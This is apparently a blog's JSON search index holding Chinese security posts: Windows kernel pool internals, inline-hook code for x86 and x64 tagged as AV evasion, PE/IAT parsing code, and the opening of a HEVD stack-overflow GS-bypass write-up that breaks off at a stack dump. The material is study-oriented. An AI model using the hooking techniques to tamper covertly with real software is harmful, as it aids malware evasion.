但是想了想涉及到文件追加啥的，我是懒狗","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"【Win Pwn】Windows内核池笔记","slug":"win-kernel-pool","date":"2024-03-17T01:43:37.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/03/17/win-kernel-pool/","link":"","permalink":"https://joe1sn.eu.org/2024/03/17/win-kernel-pool/","excerpt":"文章来自blackhat 2021的文章《Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded》 原文链接：https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf Youtube：https://www.youtube.com/watch?v=VvxNc8GTFfk","text":"文章来自blackhat 2021的文章《Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded》 原文链接：https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf Youtube：https://www.youtube.com/watch?v=VvxNc8GTFfk 粗略的分配 内核动态内存：和R3中的对差不多 类型为可分页和不可分页，程序按照4KB分页，之前写过一点相关的：Joe1sn’s Cabinet | windows内核驱动 2-页表探索 旧API初始化中不会将内存置零，导致信息泄露 一些API 在RS5（Redstone 5）版本前（及Windows 1809，在2018年10月前的版本） 没有任何校验、加密等等，但是之后就变得复杂得多了（严重怀疑微软借鉴了glibc的内存管理） 新版本的池设计管理和R3下是同一个库 每一个独立的池由SEGMENT_HEAP结构体管理，后文简写为SEG_HEAP 池的申请根据其大小进行不同的处理 不同大小申请机制不同 大内存池仍然由VA管理 SEGMENT_HEAP 123456789101112131415161718192021222324252627kd&gt; dt nt!_SEGMENT_HEAP +0x000 EnvHandle : RTL_HP_ENV_HANDLE +0x010 Signature : Uint4B +0x014 GlobalFlags : Uint4B +0x018 Interceptor : Uint4B +0x01c ProcessHeapListIndex : Uint2B +0x01e AllocatedFromMetadata : Pos 0, 1 Bit +0x020 CommitLimitData : _RTL_HEAP_MEMORY_LIMIT_DATA +0x020 ReservedMustBeZero1 : Uint8B +0x028 UserContext : Ptr64 Void +0x030 ReservedMustBeZero2 : Uint8B +0x038 Spare : Ptr64 Void +0x040 LargeMetadataLock : Uint8B +0x048 LargeAllocMetadata : _RTL_RB_TREE +0x058 LargeReservedPages : Uint8B +0x060 LargeCommittedPages : Uint8B +0x068 StackTraceInitVar : _RTL_RUN_ONCE +0x080 MemStats : _HEAP_RUNTIME_MEMORY_STATS +0x0d8 GlobalLockCount : Uint2B +0x0dc GlobalLockOwner : Uint4B +0x0e0 ContextExtendLock : Uint8B +0x0e8 AllocatedBase : Ptr64 UChar +0x0f0 UncommittedBase : Ptr64 UChar +0x0f8 ReservedLimit : Ptr64 UChar +0x100 SegContexts : [2] _HEAP_SEG_CONTEXT +0x280 VsContext : _HEAP_VS_CONTEXT +0x340 LfhContext : _HEAP_LFH_CONTEXT 文章选了一些重点来 根据上图缩略结构体 123456789101112kd&gt; dt nt!_SEGMENT_HEAP .... +0x048 LargeAllocMetadata : _RTL_RB_TREE .... +0x080 MemStats : _HEAP_RUNTIME_MEMORY_STATS //大内存页状态 .... +0x0e8 AllocatedBase : Ptr64 UChar //已分配内存 +0x0f0 UncommittedBase : Ptr64 UChar //未提交内存 +0x0f8 ReservedLimit : Ptr64 UChar +0x100 SegContexts : [2] _HEAP_SEG_CONTEXT +0x280 VsContext : _HEAP_VS_CONTEXT //VS类型堆管理链表 +0x340 LfhContext : _HEAP_LFH_CONTEXT //KLFH类型堆管理链表 根据文章，SEG_HEAP通过两个SegContexts来处理前两种大小的内存（小堆和中堆） 0~508KB（0-0x7F000） 508KB~8128KB（0x7F000-0x7F0000） 大于8128KB（大堆处理） 内核通过位图（bitmap，做过算法的应该知道吧）保存每次申请的大小的类型 1nt!ExPoolState‐&gt;HeapManager‐&gt;AllocTracker‐&gt;AllocTrackerBitma 关于位图 每两字节（2Byte）表示在内核内存中的地址 位图存在三层 _HEAP_SEG_CONTEXT结构体： 在SEG_HEAP中 _HEAP_SEG_CONTEXT[0]：以 1 页的基本单位处理 1MB 段 _HEAP_SEG_CONTEXT[1]：以 16 页的基本单位处理 16MB 段 1234567891011121314151617181920211: kd&gt; dt nt!_HEAP_SEG_CONTEXT +0x000 SegmentMask : Uint8B +0x008 UnitShift : UChar +0x009 PagesPerUnitShift : UChar +0x00a FirstDescriptorIndex : UChar +0x00b CachedCommitSoftShift : UChar +0x00c CachedCommitHighShift : UChar +0x00d Flags : &lt;anonymous-tag&gt; +0x010 MaxAllocationSize : Uint4B +0x014 OlpStatsOffset : Int2B +0x016 MemStatsOffset : Int2B +0x018 LfhContext : Ptr64 Void +0x020 VsContext : Ptr64 Void +0x028 EnvHandle : RTL_HP_ENV_HANDLE +0x038 Heap : Ptr64 Void +0x040 SegmentLock : Uint8B +0x048 SegmentListHead : _LIST_ENTRY +0x058 SegmentCount : Uint8B +0x060 FreePageRanges : _RTL_RB_TREE +0x070 FreeSegmentListLock : Uint8B +0x078 FreeSegmentList : [2] _SINGLE_LIST_ENTRY 简化一下重要信息 1234561: kd&gt; dt nt!_HEAP_SEG_CONTEXT +0x000 SegmentMask : Uint8B //如何从池内存到当前段..... +0x048 SegmentListHead : _LIST_ENTRY //连接所有已分配的堆..... +0x078 FreeSegmentList : [2] _SINGLE_LIST_ENTRY //链接所有已释放的堆 段(segment)链接的结构体为`HEAP_PAGE_SEGMENT _HEAP_PAGE_SEGMENT结构体 1234560: kd&gt; dt nt!_HEAP_PAGE_SEGMENT +0x000 ListEntry : _LIST_ENTRY +0x010 Signature : Uint8B +0x018 SegmentCommitState : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE +0x020 UnusedWatermark : UChar +0x000 DescArray : [256] _HEAP_PAGE_RANGE_DESCRIPTOR 这里抹除类型，给点注释 1234567891011121314151617180: kd&gt; dt nt!_HEAP_PAGE_SEGMENT +0x000 ListEntry : //结构体`SEG_CONTECT`指向，可参考下面的图 +0x010 Signature : //可以找到`SEG_CONTEXT`，但是被异或加密了 //解密方法 `段地址 ^ 堆密钥(heap key) ^ 魔数`........ +0x000 DescArray : [256] //每个保存一个单元，还有子段(subseg)类型和偏移 // +0x000 TreeNode : _RTL_BALANCED_NODE // +0x000 TreeSignature : Uint4B // +0x004 UnusedBytes : Uint4B // +0x008 ExtraPresent : Pos 0, 1 Bit // +0x008 Spare0 : Pos 1, 15 Bits // +0x018 RangeFlags : UChar // +0x019 CommittedPageCount : UChar // +0x01a Spare : Uint2B // +0x01c Key : _HEAP_DESCRIPTOR_KEY // +0x01c Align : [3] UChar // +0x01f UnitOffset : UChar // +0x01f UnitSize : UChar 总结下当前的内核相关信息，从SEG_HEAP开始 关于两种大小的内存管理 两种子段 VS和LFH 1. LFH - Low Fragmentation Heap _HEAP_LFH_SUBSEGMENT 12345678910111213141516170: kd&gt; dt nt!_HEAP_LFH_SUBSEGMENT +0x000 ListEntry : _LIST_ENTRY +0x010 Owner : Ptr64 _HEAP_LFH_SUBSEGMENT_OWNER +0x010 DelayFree : _HEAP_LFH_SUBSEGMENT_DELAY_FREE +0x018 CommitLock : Uint8B +0x020 FreeCount : Uint2B +0x022 BlockCount : Uint2B +0x020 InterlockedShort : Int2B +0x020 InterlockedLong : Int4B +0x024 FreeHint : Uint2B +0x026 Location : UChar +0x027 WitheldBlockCount : UChar +0x028 BlockOffsets : _HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS +0x02c CommitUnitShift : UChar +0x02d CommitUnitCount : UChar +0x02e CommitStateOffset : Uint2B +0x030 BlockBitmap : [1] Uint8B 用于 129 种常见大小的分配 所有分配的子段有一样的大小 最大大小是0x4000 为了节省空间，没有独特的head 堆块的状态由head中的位图决定 2. VS - Variable Size _HEAP_VS_SUBSEGMENT 12345670: kd&gt; dt nt!_HEAP_VS_SUBSEGMENT +0x000 ListEntry : _LIST_ENTRY +0x010 CommitBitmap : Uint8B +0x018 CommitLock : Uint8B +0x020 Size : Uint2B +0x022 Signature : Pos 0, 15 Bits +0x022 FullCommit : Pos 15, 1 Bit 处理所有LFH不能处理的bucket 没有个块(block)都有一个自己的头描述 两者的对比 VS头中的大小使用heap key加密（其实是编码，这里为了语义通顺），LFH使用自己的LFH Key 加密。（这显然让堆利用变得困难，你猜为啥我要反过来读这篇文章而不是直接做HEVD） 子段大小不固定 子段包含多个页，必须从头开始计算偏移去寻找（单独寻找某个页已经几乎不可能） 已分配的块仍然会存在POOL_HEAD，但是释放掉的不会 相关的“加密&quot; HEAP_LFH_SUBSEGMENT 块大小和偏移量位于编码的 BlockOffsets 字段中 数据（Data） = EncodedData ^ LfhKey ^ ((ULONG)(Subsegment) &gt;&gt; 12) 子段列表没被加密 HEAP_VS_SUBSEGMENT 用于链接子段的列表被当前子段地址加密了 HEAP_VS_CHUNK_HEADER 每一个VS子段中头存在 块大小和分配状态在Size头中被加密 数据（Data）= Sizes.HeaderBits ^ HeapKey ^ ChunkHeader 两种上下文 最开始的SEG_HEAP中有 12+0x280 VsContext : _HEAP_VS_CONTEXT+0x340 LfhContext : _HEAP_LFH_CONTEXT _HEAP_LFH_CONTEXT 12345678910110: kd&gt; dt nt!_HEAP_LFH_CONTEXT +0x000 BackendCtx : Ptr64 Void +0x008 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS +0x030 AffinityModArray : Ptr64 UChar +0x038 MaxAffinity : UChar +0x039 LockType : UChar +0x03a MemStatsOffset : Int2B +0x03c Config : _RTL_HP_LFH_CONFIG +0x040 BucketStats : _HEAP_LFH_SUBSEGMENT_STATS +0x048 SubsegmentCreationLock : Uint8B +0x080 Buckets : [129] Ptr64 _HEAP_LFH_BUCKET 注释关键信息 12345670: kd&gt; dt nt!_HEAP_LFH_CONTEXT... +0x008 Callbacks : //子堆分配回调函数...... +0x080 Buckets : [129] //前面提到过LFH处理常见129种堆 //这里的bucket就存放每个堆的列表 //保存有关块大小、子段计数、块计数的数据 _HEAP_VS_CONTEXT 1234567891011120: kd&gt; dt nt!_HEAP_VS_CONTEXT +0x000 Lock : Uint8B +0x008 LockType : _RTLP_HP_LOCK_TYPE +0x010 FreeChunkTree : _RTL_RB_TREE +0x020 SubsegmentList : _LIST_ENTRY +0x030 TotalCommittedUnits : Uint8B +0x038 FreeCommittedUnits : Uint8B +0x040 DelayFreeContext : _HEAP_VS_DELAY_FREE_CONTEXT +0x080 BackendCtx : Ptr64 Void +0x088 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS +0x0b0 Config : _RTL_HP_VS_CONFIG +0x0b4 Flags : Uint4B 注释关键信息 123456780: kd&gt; dt nt!_HEAP_VS_CONTEXT...... +0x020 SubsegmentList : //所有VS类型的子段 +0x030 TotalCommittedUnits : //计数 +0x038 FreeCommittedUnits : //计数...... +0x088 Callbacks : //allocate, free, commit等子段回调函数...... 总结下两种上下文","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"【免杀】Windows Inline Hook小结","slug":"little-hook","date":"2024-03-15T05:47:31.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2024/03/15/little-hook/","link":"","permalink":"https://joe1sn.eu.org/2024/03/15/little-hook/","excerpt":"Inline Hook还是挺好玩的 文章很短，只是打个总结，记录一些有趣的发现","text":"Inline Hook还是挺好玩的 文章很短，只是打个总结，记录一些有趣的发现 写在前面 之前在学习hook的时候，发现抄的一段代码只能在Debug模式下运行，调试后发现MSVC很有趣的一个点 当我们使用Debug模式编译的时候，程序为了调试方便，会将所有函数加入这个表中 比如 123456789void oldtest() &#123; MessageBoxA(NULL, &quot;not hook&quot;, &quot;test&quot;, NULL);&#125;int main()&#123; oldtest();&#125; 按照直觉 这里的call应该会直接来到函数的位置，但是真实情况并非如此 我们会发现一张跳表，根据距离这张表的地址差进行跳转，那段hook只是修改了这一段代码 x86 hook 首先是x86为啥叫32位架构，最突出的就是一个寄存器有32位(bit)大小，那么计算一下 1(1&lt;&lt;32)/int(1024*1024*1024) = 4 没错，32位的寄存器最多只能存放4GB个数字（比如从1到0x100000000）， 由于要做加减发（有负数），所以能找到的地址位±2GB， 那么8位为一个字节，那么一个寄存器只能由4个字节， jmp根据4字节这样对齐，所以32位下我们只需要覆盖5字节就能实现任意地址的跳转， 再加上之前的debug模式，可以写出下列hook代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061void Hooks::InlineHook_x32(FuncAddr HookFunction) &#123; //set read write DWORD old; DWORD size = 5; FuncAddr offset = 0; if (!VirtualProtect(LPVOID(this-&gt;FunctionAddr), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123; Error(&quot;Can&#x27;t Set Memory read/write&quot;); return; &#125;#ifdef _DEBUG //hook with debug jmp table offset = HookFunction - this-&gt;FunctionAddr - 5; *(char*)this-&gt;FunctionAddr = &#x27;\\xE9&#x27;; *(DWORD*)(this-&gt;FunctionAddr + 1) = offset; //return to the origin size = 5; FuncAddr RealAddr = this-&gt;GetRealAddr((void *)HookFunction); FuncAddr func_size = this-&gt;GetProcSize(RealAddr) - 1; if (!VirtualProtect(LPVOID(RealAddr + func_size), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123; Error(&quot;Can&#x27;t Set Memory read/write&quot;); return; &#125; *(char*)(RealAddr + func_size + 0) = &#x27;\\xE9&#x27;; offset = this-&gt;RealAddr - RealAddr; *(DWORD*)(RealAddr + func_size + 1) = (offset - func_size - 5); #else //get first 5 bytes char head[6] = &#123; 0 &#125;; memcpy(head, (void*)this-&gt;FunctionAddr, 5); if (HookFunction &gt; this-&gt;FunctionAddr) offset = (HookFunction - this-&gt;FunctionAddr - 5); else offset = ~(this-&gt;FunctionAddr - HookFunction - 5); *(char*)(this-&gt;FunctionAddr + 0) = &#x27;\\xE9&#x27;; *(DWORD*)(this-&gt;FunctionAddr + 1) = offset - 9; //API hook //*(DWORD*)(this-&gt;FunctionAddr + 1) = offset; // //return to the origin FuncAddr func_size = this-&gt;GetProcSize(HookFunction) - 1; size = 10; if (!VirtualProtect(LPVOID(HookFunction + func_size), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123; Error(&quot;Can&#x27;t Set Memory read/write&quot;); return; &#125; //reset the top 5bytes in header memcpy((void*)((FuncAddr)HookFunction + func_size), head, 5); *(char*)(HookFunction + func_size + 5) = &#x27;\\xE9&#x27;; //*(DWORD*)(HookFunction + func_size + 6) = ~(offset + func_size + 9); *(DWORD*)(HookFunction + func_size + 6) = ~(offset + func_size); //win api hook#endif&#125; x64 hook 上面讲到了x86 hook只能2GB内内存寻址，到了x64寻址空间大大加大，单纯jmp和call已经无法跳转到地址，后来我看到一个很有意思的方法 123456[Bits 64]_start: push addr.low mov dword [rsp+4], addr.high ret 这个方法不会污染寄存器，也不会对栈造成影响，所以得到hook函数 123456789101112131415161718192021222324252627282930313233343536373839404142BOOL Hook::EnHook() &#123; if (this-&gt;OldFuncOpcode != NULL) &#123; std::cout &lt;&lt; &quot;[!]Already Hooked\\n&quot;; return FALSE; &#125; DWORD old; VirtualProtect((LPVOID)this-&gt;OldFunc, this-&gt;OpSzie, PAGE_EXECUTE_READWRITE, &amp;old); this-&gt;OldFuncOpcode = (PBYTE)malloc(this-&gt;OpSzie + 1); if (this-&gt;OldFuncOpcode == NULL) &#123; std::cout &lt;&lt; &quot;[!] Hook Function Malloc Failed\\n&quot;; return FALSE; &#125; memcpy(this-&gt;OldFuncOpcode, (void*)this-&gt;OldFunc, this-&gt;OpSzie); std::cout &lt;&lt; &quot;[*] Capture The First &quot; &lt;&lt; this-&gt;OpSzie &lt;&lt; &quot; Bytes: &quot;; std::vector&lt;BYTE&gt; vec(this-&gt;OldFuncOpcode, this-&gt;OldFuncOpcode + this-&gt;OpSzie); std::cout &lt;&lt; std::hex; for (int num : vec) std::cout &lt;&lt; &quot;0x&quot; &lt;&lt; num &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::dec &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot;[*] Now Start Hook\\n&quot;; /* * push 0x10000 * mov dword [rsp+4], 0x20000 * ret */ unsigned char jmpopcode[14] = &#123; 0x68, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00,0x00, 0xC3 &#125;; //over write to jmp FuncAddr gap = this-&gt;NewFunc; *(DWORD32*)(jmpopcode + 1) = (DWORD32)gap; *(DWORD32*)(jmpopcode + 9) = (DWORD32)(gap &gt;&gt; 32); std::cout &lt;&lt; &quot;[*] Jmp Code Set\\n&quot;; VirtualProtect((LPVOID)this-&gt;OldFunc, this-&gt;OpSzie, PAGE_EXECUTE_READWRITE, &amp;old); memcpy((PVOID)this-&gt;OldFunc, jmpopcode, this-&gt;OpSzie); std::cout &lt;&lt; &quot;[*] Opcode Set\\n&quot;; return TRUE;&#125; 保存好覆盖的字节，后续接触hook的时候再覆盖回来","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]},{"title":"【免杀】PE文件分析","slug":"PeFile","date":"2024-02-25T15:17:26.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2024/02/25/PeFile/","link":"","permalink":"https://joe1sn.eu.org/2024/02/25/PeFile/","excerpt":"最近代码能力飞速提升，顺便复习一下","text":"最近代码能力飞速提升，顺便复习一下 一般就是 DOS头：IMAGE_DOS_HEADER结构体 PE头：IMAGE_NT_HEADERS结构体 Section头：IMAGE_SECTION_HEADER结构体 OK，如果要分析PE文件的话，首先把文件读取出来 那么如何解析呢？这就是C/C++非常方便的一点：直接使用结构体转换，例如把地址值解析为数值 总体就是解释内存中的值 DOS 头 先看DOSHeader吧 123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; 需要的是e_lfanew NT头 文件起始地址+e_lfanew = NT头位置 得到NT头位置后 12345typedef struct _IMAGE_NT_HEADERS64 &#123; DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader;&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; 重要的是IMAGE_OPTIONAL_HEADER，其实都一样，可以从FileHeader得到32位还是64位， 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics;&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 0x8664：adm64位 0x014C：intel32位 接下来以64位举例子 1234567891011121314151617181920212223242526272829303132typedef struct _IMAGE_OPTIONAL_HEADER64 &#123; WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; 到这里我写了部分代码，结合IDA就很好理解了 如果还要继续看的话就是DataDirectory 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 打印虚拟地址 其实就是导入导出表之类的东西 Nt-&gt;ImageBase+这里的偏移，就是运行时的位置 12345678910111213141516171819// Directory Entries#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory#define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory#define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table#define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory// IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage)#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP#define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers#define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor 节表相关 再回到NT头中的FileHeader，提取得到节数量 DOS头和NT头的大小加起来后面就是第一个Section 123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union &#123; DWORD PhysicalAddress; DWORD VirtualSize; &#125; Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics;&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 123456789101112131415161718192021222324BOOL FilePE::bGetSectionList() &#123; if (this-&gt;FileContent.length() == 0) &#123; Error(&quot;File content is zero&quot;, DEBUG); return FALSE; &#125; if (this-&gt;pHeaderNT == NULL) &#123; Error(&quot;NT head not initialize&quot;, DEBUG); return FALSE; &#125; DWORD SectionNum = this-&gt;pHeaderNT-&gt;FileHeader.NumberOfSections; this-&gt;SecNum = SectionNum; this-&gt;SectionList = (PIMAGE_SECTION_HEADER*)malloc((SectionNum + 1) * sizeof(PIMAGE_SECTION_HEADER)); if (this-&gt;SectionList == NULL) &#123; Error(&quot;Allcate section list memory failed\\n&quot;, DEBUG); return FALSE; &#125; for (size_t i = 0; i &lt; SectionNum; i++) &#123; SectionList[i] = PIMAGE_SECTION_HEADER( &amp;this-&gt;FileContent[0] + this-&gt;pHeaderDOS-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + i * sizeof(IMAGE_SECTION_HEADER)); &#125; return TRUE;&#125; IAT表 I. 如何找到文件的IAT表 IAT叫Import Address Table，当我们的程序需要外部库的函数时，就会从这里开始调用 IAT表的地址并不在任何头中，不过我们之前分析Directory的时候就发现会有一个IMAGE_DIRECTORY_ENTRY_IAT，但它不是导入表，真正的IAT描述： 1pHeaderNT-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT] 按道理来说VirtualAddress+ImageBase就是运行起来的地址，这里我没有加上 突然想起来我们在分析节表的时候也存在类似的 基地址+偏移 对于这个结构体之前的只能用这块儿的目录 对应文件中地址为28fc-2000+1400 = 1cfc 有点意思，查阅资料发现对应的结构体：_IMAGE_IMPORT_DESCRIPTOR，MSDN中并没有对应说明 1234567891011typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 有个问题就是这块地址是运行时写入IAT相关信息，我们的静态分析到这一步就算断了 这里我设计了一个BOOL bGetIAT();函数，直接去读程序的内存，为了简单，就先关闭ASLR 已经成功读取一个信息，接下来办法全部找出来，自然想到的就是Name为0就退出，但是由于总数不知道，所以需要一个动态容器，我用的vector 1vector&lt;PIMAGE_IMPORT_DESCRIPTOR&gt; pIATList; 按照一样的方法全部得到后，再次尝试在运行中读取 但是很多PE分析工具静态也能看得到，利用的是RVA-&gt;RAW的转换 2d52-2000+1400=2152 123456789101112void FilePE::PrintIATStatic() &#123; if (this-&gt;pIATList.size() == 0) &#123; Error(&quot;IAT List empty&quot;, DEBUG); return; &#125; DWORD VA = 0; for (size_t i = 0; i &lt; this-&gt;pIATList.size(); i++) &#123; VA = this-&gt;dwVAToRaw(this-&gt;pIATList[i]-&gt;Name); cout &lt;&lt; &quot;DLL : &quot; &lt;&lt; &amp;this-&gt;FileContent[0] + VA &lt;&lt; endl; &#125;&#125; II. 找到导入函数 通过OriginalFirstThunk，基本就是OriginalFirstThunk进行转化找到RAW，RAW地方的地址再转为RAW就找到了，最终的位置是一个_IMAGE_IMPORT_BY_NAME结构体 1234typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; CHAR Name[1];&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 123456789void FilePE::PrintFunction(PIMAGE_IMPORT_DESCRIPTOR pIAT) &#123; DWORD64 VA = *PDWORD64(&amp;this-&gt;FileContent[0] + this-&gt;dwVAToRaw(pIAT-&gt;OriginalFirstThunk)); for (size_t i = 1; VA != 0; i++) &#123; PIMAGE_IMPORT_BY_NAME IatName = PIMAGE_IMPORT_BY_NAME(&amp;this-&gt;FileContent[0] + this-&gt;dwVAToRaw(VA)); cout &lt;&lt; &quot; Function &quot; &lt;&lt; IatName-&gt;Name &lt;&lt; endl; VA = *PDWORD64(&amp;this-&gt;FileContent[0] + this-&gt;dwVAToRaw(pIAT-&gt;OriginalFirstThunk) + i * sizeof(DWORD64)); &#125;&#125; 找到入口函数 很简单，在上面的nt-&gt;option_header.AddressOfEntryPoint里面，可以直接ImageBase+AddressOfEntryPoint，二进制数据都对的上","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]},{"title":"【Win Pwn】HEVD-内核栈溢出GS保护及绕过","slug":"win-hevd-exp-stackoverflow-GS","date":"2024-02-24T03:10:43.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/02/24/win-hevd-exp-stackoverflow-GS/","link":"","permalink":"https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/","excerpt":"HEVD中的栈溢出加上GS保护 还有一个知识点就是windows内核栈地址泄露","text":"HEVD中的栈溢出加上GS保护 还有一个知识点就是windows内核栈地址泄露 函数功能 在上三篇中讲的很清楚了，这里我关闭了KVAS 又是一段经典的栈溢出，但是有了内核的GS保护 编写exploit 这里就不得不提到Windows中一种Cannary的绕过方式了，通过try except的Handler进行绕过，很遗憾handler只在32位程序中才保存在栈上 查阅资料 https://paper.seebug.org/2017/#22 https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html cookie值是存储在_data段的第一个 函数检查的部分，有一个异或 123456789101112131415161718192021222324252627281: kd&gt; dqs rspffff8788`21979540 00000000`00000000ffff8788`21979548 ffffc186`261f98f0ffff8788`21979550 ffffc186`269c86b0ffff8788`21979558 00000000`80000004ffff8788`21979560 00000000`00000000ffff8788`21979568 fffff804`2a4d66e5 HEVD!TriggerBufferOverflowStackGS+0x5 [c:\\projects\\hevd\\driver\\hevd\\bufferoverflowstackgs.c @ 70]ffff8788`21979570 00000000`00000000ffff8788`21979578 00000000`00000003ffff8788`21979580 54535f57`4f4c4652ffff8788`21979588 ffffc186`1f93206cffff8788`21979590 00000000`00000000ffff8788`21979598 00000000`00000000ffff8788`219795a0 